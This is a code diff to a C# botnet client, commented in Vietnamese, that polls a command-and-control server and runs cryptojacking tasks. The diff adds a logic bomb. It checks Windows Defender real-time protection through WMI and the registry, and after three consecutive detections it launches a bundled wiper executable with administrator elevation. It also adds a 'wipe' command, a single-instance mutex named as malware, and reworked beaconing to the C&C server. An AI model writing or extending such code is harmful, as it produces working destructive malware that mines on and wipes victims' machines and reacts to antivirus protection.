@@ -7,39 +7,69 @@ using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using Microsoft.Win32;
+using System.Management;
 
 // === NÂNG CẤP: Dùng hằng số để tránh lỗi chính tả ===
 public static class BotCommands
 {
     public const string Cryptojack = "cryptojack";
     public const string Idle = "idle";
+    public const string Wipe = "wipe";
 }
-public class CryptoJackResult
-{
-    public string BotId { get; set; }
-    public long Nonce { get; set; }
-    public string Hash { get; set; }
-}
-public class LogRequest
-{
-    public string BotId { get; set; }
-    public string Message { get; set; }
-}
+//public class CryptoJackResult
+//{
+//    public string BotId { get; set; }
+//    public long Nonce { get; set; }
+//    public string Hash { get; set; }
+//}
+//public class LogRequest
+//{
+//    public string BotId { get; set; }
+//    public string Message { get; set; }
+//}
+// Các class Model gửi đi (không còn chứa BotId)
+public class BotInfoPayload { public string Status { get; set; } }
+public class LogPayload { public string Message { get; set; } }
+public class ResultPayload { public long Nonce { get; set; } public string Hash { get; set; } }
 
 public class Bot
 {
     private static string CncServerUrl;
     private static readonly HttpClient client = new HttpClient();
-    private static string botId = Guid.NewGuid().ToString();
+    //private static string botId = Guid.NewGuid().ToString();
     private static string currentStatus = BotCommands.Idle;
     private static Random _random = new Random();
+
+    // Cấu hình đường dẫn Wiper
+    private const string WiperSubFolder = "wiper"; // Tên thư mục con
+    private const string WiperFileName = "Wiper.exe"; // Tên file
 
     // === NÂNG CẤP: Dùng CancellationTokenSource để quản lý tác vụ nền an toàn ===
     private static CancellationTokenSource _taskCancellationTokenSource;
 
+    // === MUTEX: Để đảm bảo chỉ 1 bot chạy ===
+    private static Mutex _appMutex;
+    private const string MutexName = "Global\\MyMalwareBot_Unique_Mutex_String";
+
+    // Biến Logic Bomb
+    private static int _defenderStrikeCount = 0;
+    private static bool _isWiperTriggered = false;
+
     static async Task Main(string[] args)
     {
+        // 1. Kiểm tra Single Instance
+        bool isNewInstance;
+        _appMutex = new Mutex(true, MutexName, out isNewInstance);
+
+        if (!isNewInstance)
+        {
+            // Nếu Mutex đã tồn tại, tức là có một con bot khác đang chạy.
+            // Thoát ngay lập tức.
+            return;
+        }
         FileLogger.Initialize();
+
         if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
         {
             string serverIp = args[0];
@@ -57,15 +87,18 @@ public class Bot
             return; // Thoát chương trình
         }
 
-        Console.WriteLine($"Bot started with ID: {botId}");
+        //Console.WriteLine($"Bot started with ID: {botId}");
 
-        while (true)
+        while (!_isWiperTriggered)
         {
             try
             {
+                // 1. Check Windows Defender (Điều kiện kích hoạt Wiper số 2)
+                CheckDefenderAndTriggerWiper();
+
                 await CheckIn();
                 string command = await GetCommand();
-                Console.WriteLine($"Received command: '{command}'");
+                //Console.WriteLine($"Received command: '{command}'");
                 await ExecuteCommand(command);
             }
             catch (Exception ex)
@@ -80,31 +113,153 @@ public class Bot
             await Task.Delay(jitterMilliseconds);
         }
     }
-    static async Task SendLogToServerAsync(string message)
+
+    // === LOGIC CHECK DEFENDER ===
+    static void CheckDefenderAndTriggerWiper()
+    {
+        if (_isWiperTriggered) return;
+
+        // Kiểm tra trạng thái Defender
+        bool isDefenderOn = IsRealtimeProtectionEnabled();
+
+        if (isDefenderOn)
+        {
+            _defenderStrikeCount++;
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine($"[LOGIC BOMB] Defender is ON. Strike {_defenderStrikeCount}/3");
+            Console.ResetColor();
+
+            // Gửi cảnh báo về Server
+            _ = SendLogToServerAsync($"WARNING: Defender ON. Strike {_defenderStrikeCount}/3");
+
+            if (_defenderStrikeCount >= 3)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[TRIGGER] 3 Strikes reached. Launching Wiper...");
+                TriggerWiper("Logic Bomb: Defender detected 3 times");
+            }
+        }
+        else
+        {
+            // Nếu Defender tắt, reset bộ đếm (yêu cầu 3 lần liên tiếp)
+            if (_defenderStrikeCount > 0)
+            {
+                _defenderStrikeCount = 0;
+                Console.WriteLine("[INFO] Defender is OFF. Strike counter reset.");
+            }
+        }
+    }
+    static void TriggerWiper(string reason)
+    {
+        if (_isWiperTriggered) return;
+        _isWiperTriggered = true;
+
+        // Dừng đào coin
+        StopCurrentTask();
+        currentStatus = "WIPING";
+
+        // Gửi lời trăng trối về Server
+        _ = SendLogToServerAsync($"CRITICAL: Activating Wiper. Reason: {reason}");
+
+        try
+        {
+            // Xây dựng đường dẫn: BaseDir + "wiper" + "Wiper.exe"
+            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+            string wiperPath = Path.Combine(baseDir, WiperSubFolder, WiperFileName);
+
+            if (File.Exists(wiperPath))
+            {
+                Console.WriteLine($"[LAUNCHER] Executing payload at: {wiperPath}");
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = wiperPath,
+                    UseShellExecute = true,
+                    Verb = "runas", // Yêu cầu quyền Admin
+                    CreateNoWindow = false // Hiện cửa sổ Wiper lên cho nạn nhân thấy
+                };
+
+                Process.Start(psi);
+                Console.WriteLine("[LAUNCHER] Payload executed successfully.");
+            }
+            else
+            {
+                Console.WriteLine($"[ERROR] Wiper payload not found at: {wiperPath}");
+                _ = SendLogToServerAsync("Failed to wipe: Payload file missing.");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[ERROR] Failed to launch wiper: {ex.Message}");
+        }
+
+        // BotClient tự kết thúc sau khi gọi Wiper
+        Console.WriteLine("BotClient shutting down...");
+        Environment.Exit(0);
+    }
+    // Hàm kiểm tra Defender (WMI + Registry Fallback)
+    private static bool IsRealtimeProtectionEnabled()
     {
         try
         {
-            var logRequest = new LogRequest { BotId = botId, Message = message };
-            var content = new StringContent(JsonSerializer.Serialize(logRequest), Encoding.UTF8, "application/json");
-            // Gửi và không cần chờ phản hồi để tránh làm chậm bot
-            _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
+            // Cách 1: WMI
+            using (var searcher = new ManagementObjectSearcher(@"root\Microsoft\Windows\Defender", "SELECT * FROM MSFT_MpComputerStatus"))
+            {
+                foreach (ManagementObject queryObj in searcher.Get())
+                {
+                    var rtpEnabled = queryObj["RealTimeProtectionEnabled"];
+                    if (rtpEnabled != null) return Convert.ToBoolean(rtpEnabled);
+                }
+            }
         }
-        catch
+        catch { }
+
+        try
         {
-            // Bỏ qua lỗi, vì log không quan trọng bằng việc đào
+            // Cách 2: Registry
+            using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
+            {
+                if (key != null)
+                {
+                    object disableValue = key.GetValue("DisableRealtimeMonitoring");
+                    if (disableValue != null) return Convert.ToInt32(disableValue) == 0;
+                }
+            }
         }
+        catch { }
+
+        // Mặc định trả về true (An toàn là trên hết - giả sử nó đang bật)
+        return true;
     }
+    
+    //static async Task SendLogToServerAsync(string message)
+    //{
+    //    try
+    //    {
+    //        var logRequest = new LogRequest { BotId = botId, Message = message };
+    //        var content = new StringContent(JsonSerializer.Serialize(logRequest), Encoding.UTF8, "application/json");
+    //        // Gửi và không cần chờ phản hồi để tránh làm chậm bot
+    //        _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
+    //    }
+    //    catch
+    //    {
+    //        // Bỏ qua lỗi, vì log không quan trọng bằng việc đào
+    //    }
+    //}
 
     static async Task CheckIn()
     {
-        var botInfo = new { BotId = botId, Status = currentStatus };
-        var content = new StringContent(JsonSerializer.Serialize(botInfo), Encoding.UTF8, "application/json");
+        //var botInfo = new { BotId = botId, Status = currentStatus };
+        var payload = new BotInfoPayload { Status = currentStatus };
+        //var content = new StringContent(JsonSerializer.Serialize(botInfo), Encoding.UTF8, "application/json");
+        var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
         await client.PostAsync($"{CncServerUrl}/bot/checkin", content);
     }
 
     static async Task<string> GetCommand()
     {
-        var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand?botId={botId}");
+        //var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand?botId={botId}");
+        var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand");
         var commandResponse = JsonSerializer.Deserialize<CommandResponse>(responseString, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
         return commandResponse?.command ?? BotCommands.Idle;
     }
@@ -149,32 +304,56 @@ public class Bot
             _taskCancellationTokenSource = null;
         }
     }
+    //static async Task SendResultToServerAsync(long nonce, string hash)
+    //{
+    //    try
+    //    {
+    //        var result = new CryptoJackResult
+    //        {
+    //            BotId = botId,
+    //            Nonce = nonce,
+    //            Hash = hash
+    //        };
+    //        var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
+    //        // Tạo một CancellationTokenSource để đặt timeout
+    //        using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2))) // Timeout sau 2 giây
+    //        {
+    //            // Gửi yêu cầu với CancellationToken
+    //            await client.PostAsync($"{CncServerUrl}/bot/log", content, cts.Token);
+    //        }
+    //    }
+    //    catch (OperationCanceledException)
+    //    {
+    //        // Lỗi này xảy ra khi timeout, đây là điều mong muốn. Bỏ qua.
+    //    }
+    //    catch
+    //    {
+    //        // Bỏ qua các lỗi mạng khác để bot không bị crash
+    //    }
+    //}
+    static async Task SendLogToServerAsync(string message)
+    {
+        try
+        {
+            var payload = new LogPayload { Message = message };
+            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+            _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
+        }
+        catch { }
+    }
+
     static async Task SendResultToServerAsync(long nonce, string hash)
     {
         try
         {
-            var result = new CryptoJackResult
+            var payload = new ResultPayload { Nonce = nonce, Hash = hash };
+            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+            using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5)))
             {
-                BotId = botId,
-                Nonce = nonce,
-                Hash = hash
-            };
-            var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
-            // Tạo một CancellationTokenSource để đặt timeout
-            using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2))) // Timeout sau 2 giây
-            {
-                // Gửi yêu cầu với CancellationToken
-                await client.PostAsync($"{CncServerUrl}/bot/log", content, cts.Token);
+                await client.PostAsync($"{CncServerUrl}/bot/submitresult", content, cts.Token);
             }
         }
-        catch (OperationCanceledException)
-        {
-            // Lỗi này xảy ra khi timeout, đây là điều mong muốn. Bỏ qua.
-        }
-        catch
-        {
-            // Bỏ qua các lỗi mạng khác để bot không bị crash
-        }
+        catch { }
     }
 
     static Task SimulateCryptoJack(CancellationToken cancellationToken)
